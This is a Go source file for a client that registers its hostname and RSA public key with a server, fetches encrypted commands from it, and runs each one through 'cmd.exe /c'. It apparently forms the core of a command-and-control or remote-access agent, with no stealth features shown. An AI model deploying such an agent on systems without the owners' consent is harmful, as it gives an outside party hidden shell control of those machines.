package core

import (
	"bytes"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/google/uuid"
)

const UNKNOWN_HOST = "UNKNOWN"
const KEYBIT_SIZE = 2048

var DefaultConfig = ClientConfig{ServerHost: "http://localhost", CommunicationEp: "command", RecognitionEp: "client"}

var DefaultIdenResult = &IdentificationResult{}
var EmptyCommand = &Command{}

type Identification struct {
	Id        string        `json:"id"`
	Hostname  string        `json:"hostname"`
	PublicKey rsa.PublicKey `json:"pubkey"`
}

type IdentificationResult struct {
	PublicKey rsa.PublicKey `json:"pubkey"`
}

type ServerIdentity = IdentificationResult

type ClientConfig struct {
	ServerHost      string
	CommunicationEp string
	RecognitionEp   string
}

type Security struct {
	PrivateKey *rsa.PrivateKey
	PublicKey  rsa.PublicKey
}

type Client struct {
	Id       string
	Hostname string

	HttpClient http.Client

	Server ServerIdentity

	Config   ClientConfig
	Security Security
	History  []Command
}

type CommandRequest struct {
	Id string
}

func (client *Client) InitClient() bool {
	uuid := uuid.New()
	hostName, err := os.Hostname()

	client.History = []Command{}

	if err != nil {
		hostName = UNKNOWN_HOST
	}

	key, err := rsa.GenerateKey(rand.Reader, KEYBIT_SIZE)

	if err != nil {
		return false
	}

	client.Id = uuid.String()
	client.Hostname = hostName

	client.Security = Security{
		PublicKey:  key.PublicKey,
		PrivateKey: key,
	}

	client.HttpClient = *http.DefaultClient

	client.Config = DefaultConfig

	return true
}

func (client *Client) IdentifyToServer() (*IdentificationResult, error) {
	config := client.Config
	httpClient := client.HttpClient

	idenPayload := Identification{Hostname: client.Hostname, Id: client.Id, PublicKey: client.Security.PublicKey}

	mIdenPayload, err := json.Marshal(idenPayload)

	if err != nil {
		return DefaultIdenResult, err
	}

	req, err := http.NewRequest(
		"POST",
		fmt.Sprintf("%s/%s", config.ServerHost, config.RecognitionEp),
		bytes.NewReader(mIdenPayload),
	)

	if err != nil {
		return DefaultIdenResult, nil
	}

	reqHeader := req.Header
	reqHeader.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)

	if err != nil {
		return DefaultIdenResult, err
	}

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return DefaultIdenResult, err
	}

	var idenResult IdentificationResult

	mErr := json.Unmarshal(body, &idenResult)

	if mErr != nil {
		return DefaultIdenResult, mErr
	}

	client.Server = idenResult

	return &idenResult, nil
}

func (client *Client) FetchCommand() (*Command, error) {
	config := client.Config
	httpClient := client.HttpClient
	clientSec := client.Security

	cmdReqInfo := CommandRequest{Id: client.Id}
	cmdReqInfoPayload, err := json.Marshal(cmdReqInfo)

	if err != nil {
		return EmptyCommand, nil
	}

	req, err := http.NewRequest(
		"GET",
		fmt.Sprintf("%s/%s", config.ServerHost, config.CommunicationEp),
		bytes.NewReader(cmdReqInfoPayload),
	)

	if err != nil {
		return EmptyCommand, err
	}

	resp, err := httpClient.Do(req)

	if err != nil {
		return EmptyCommand, err
	}

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return EmptyCommand, err
	}

	var encryptedCommand EncryptedCommand

	mErr := json.Unmarshal(body, &encryptedCommand)

	if mErr != nil {
		return EmptyCommand, err
	}

	encryptedContent := encryptedCommand.EncryptedContent
	cmdBytes, err := clientSec.PrivateKey.Decrypt(nil, encryptedContent, &rsa.OAEPOptions{Hash: crypto.SHA256})

	if err != nil {
		return EmptyCommand, err
	}

	fetchedCommand := Command{Content: string(cmdBytes), ReceivedAt: time.Now(), Id: encryptedCommand.Id}

	return &fetchedCommand, nil
}

// for now, a simple shell cmd executor, something more fancy will be implemented in next version.
func (client *Client) ExecuteCmd(command Command) *exec.Cmd {
	content := command.Content
	excCmd := exec.Command("cmd.exe", "/c", content)

	client.History = append(client.History, command)
	return excCmd
}

func (client *Client) GetLastExecutedCmd() *Command {
	history := client.History
	if len(history) <= 0 {
		return &Command{}
	}
	return &client.History[len(history)-1]
}
